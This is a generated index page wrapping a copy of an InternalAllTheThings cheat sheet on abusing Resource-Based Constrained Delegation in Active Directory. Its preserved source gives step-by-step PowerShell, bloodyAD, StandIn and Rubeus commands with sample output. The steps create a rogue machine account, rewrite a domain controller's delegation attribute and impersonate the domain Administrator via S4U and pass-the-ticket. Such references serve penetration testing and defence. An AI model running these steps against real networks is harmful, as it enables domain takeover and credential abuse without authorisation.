---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Kerberos Delegation - Resource Based Constrained Delegation

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-kerberos-delegation-rbcd` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/kerberos-delegation-rbcd.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Kerberos Delegation - Resource Based Constrained Delegation](../../topics/active-directory/kerberos-delegation-resource-based-constrained-delegation.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-kerberos-delegation-rbcd |
| name | Kerberos Delegation - Resource Based Constrained Delegation |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/kerberos-delegation-rbcd.md |

## Preserved Source Material

````yaml
_body: "# Kerberos Delegation - Resource Based Constrained Delegation\n\nResource-based Constrained Delegation was introduced\
  \ in Windows Server 2012.\n\n> The user sends a Service Ticket (ST) to access the service (\"Service A\"), and if the service\
  \ is allowed to delegate to another pre-defined service (\"Service B\"), then Service A can present to the authentication\
  \ service the TGS that the user provided and obtain a ST for the user to Service B.  <https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html>\n\
  \n1. Import **Powermad** and **Powerview**\n\n    ```powershell\n    PowerShell.exe -ExecutionPolicy Bypass\n    Import-Module\
  \ .\\powermad.ps1\n    Import-Module .\\powerview.ps1\n    ```\n\n2. Get user SID\n\n    ```powershell\n    $AttackerSID\
  \ = Get-DomainUser SvcJoinComputerToDom -Properties objectsid | Select -Expand objectsid\n    $ACE = Get-DomainObjectACL\
  \ dc01-ww2.factory.lan | ?{$_.SecurityIdentifier -match $AttackerSID}\n    $ACE\n    ConvertFrom-SID $ACE.SecurityIdentifier\n\
  \n    # alternative (Windows/Linux)\n    bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get writable\
  \ --otype COMPUTER --detail | egrep -i 'distinguishedName|msds-allowedtoactonbehalfofotheridentity'\n    ```\n\n3. Abuse\
  \ **MachineAccountQuota** to create a computer account and set an SPN for it\n\n    ```powershell\n    New-MachineAccount\
  \ -MachineAccount swktest -Password $(ConvertTo-SecureString 'Weakest123*' -AsPlainText -Force)\n\n    # alternative (Windows/Linux)\n\
  \    bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add computer swktest 'Weakest123*'\n    ```\n\
  \n4. Rewrite DC's **AllowedToActOnBehalfOfOtherIdentity** properties\n\n    ```powershell\n    $ComputerSid = Get-DomainComputer\
  \ swktest -Properties objectsid | Select -Expand objectsid\n    $SD = New-Object Security.AccessControl.RawSecurityDescriptor\
  \ -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))\"\n    $SDBytes = New-Object byte[] ($SD.BinaryLength)\n\
  \    $SD.GetBinaryForm($SDBytes, 0)\n    Get-DomainComputer dc01-ww2.factory.lan | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}\n\
  \    $RawBytes = Get-DomainComputer dc01-ww2.factory.lan -Properties 'msds-allowedtoactonbehalfofotheridentity' | select\
  \ -expand msds-allowedtoactonbehalfofotheridentity\n    $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor\
  \ -ArgumentList $RawBytes, 0\n    $Descriptor.DiscretionaryAcl\n\n    # alternative (Windows/Linux)\n    # use 'remove'\
  \ instead of 'add' after exploit\n    bloodyAD --host 10.1.0.4 -u user -p 'totoTOTOtoto1234*' -d crash.lab add rbcd 'dc01-ww2$'\
  \ 'swktest$'\n    ```\n\n    ```ps1\n    # alternative\n    $SID_FROM_PREVIOUS_COMMAND = Get-DomainComputer MACHINE_ACCOUNT_NAME\
  \ -Properties objectsid | Select -Expand objectsid\n    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList\
  \ \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$SID_FROM_PREVIOUS_COMMAND)\"; $SDBytes = New-Object byte[] ($SD.BinaryLength);\
  \ $SD.GetBinaryForm($SDBytes, 0); Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}\n\
  \n    # alternative\n    StandIn_Net35.exe --computer dc01 --sid SID_FROM_PREVIOUS_COMMAND\n    ```\n\n5. Use Rubeus to\
  \ get hash from password\n\n    ```powershell\n    Rubeus.exe hash /password:'Weakest123*' /user:swktest$  /domain:factory.lan\n\
  \    [*] Input password             : Weakest123*\n    [*] Input username             : swktest$\n    [*] Input domain \
  \              : factory.lan\n    [*] Salt                       : FACTORY.LANswktest\n    [*]       rc4_hmac          \
  \   : F8E064CA98539B735600714A1F1907DD\n    [*]       aes128_cts_hmac_sha1 : D45DEADECB703CFE3774F2AA20DB9498\n    [*] \
  \      aes256_cts_hmac_sha1 : 0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347\n    [*]       des_cbc_md5\
  \          : BA297CFD07E62A5E\n    ```\n\n6. Impersonate domain admin using our newly created machine account\n\n    ```powershell\n\
  \    .\\Rubeus.exe s4u /user:swktest$ /rc4:F8E064CA98539B735600714A1F1907DD /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan\
  \ /ptt /altservice:cifs,http,host,rpcss,wsman,ldap\n    .\\Rubeus.exe s4u /user:swktest$ /aes256:0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347\
  \ /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap\n\n\
  \    [*] Impersonating user 'Administrator' to target SPN 'cifs/dc01-ww2.factory.lan'\n    [*] Using domain controller:\
  \ DC01-WW2.factory.lan (172.16.42.5)\n    [*] Building S4U2proxy request for service: 'cifs/dc01-ww2.factory.lan'\n    [*]\
  \ Sending S4U2proxy request\n    [+] S4U2proxy success!\n    [*] base64(ticket.kirbi) for SPN 'cifs/dc01-ww2.factory.lan':\n\
  \n        doIGXDCCBligAwIBBaEDAgEWooIFXDCCBVhhggVUMIIFUKADAgEFoQ0bC0ZBQ1RPUlkuTEFOoicwJaAD\n        AgECoR4wHBsEY2lmcxsUZGMwMS[...]PMIIFC6ADAgESoQMCAQOiggT9BIIE\n\
  \        LmZhY3RvcnkubGFu\n\n    [*] Action: Import Ticket\n    [+] Ticket successfully imported!\n    ```\n\n## References\n\
  \n* [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory - 28 January 2019 - Elad\
  \ Shami](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)\n* [A Case Study in Wagging the Dog: Computer Takeover\
  \ - Will Schroeder - Feb 28, 2019](https://posts.specterops.io/a-case-study-in-wagging-the-dog-computer-takeover-2bcb7f94c783)"
_relative_path: active-directory/kerberos-delegation-rbcd.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/kerberos-delegation-rbcd.md
````
